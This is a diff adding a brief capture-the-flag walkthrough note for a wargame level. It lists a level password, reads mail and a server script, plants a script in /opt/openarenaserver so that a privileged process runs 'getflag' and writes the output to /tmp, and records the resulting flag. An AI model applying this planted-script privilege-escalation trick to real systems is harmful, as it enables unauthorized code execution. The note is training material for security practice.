@@ -1,0 +1,11 @@
+su level05
+password: ne2searoevaevoem4ov4ar8ap
+
+cat /var/mail/level05
+cat /usr/sbin/openarenaserver
+cd /opt/openarenaserver
+vim script.sh => getflag > /tmp/file
+chmod +x script.sh
+cat /tmp/file
+
+the flag:  viuaaale9huek52boumoomioc
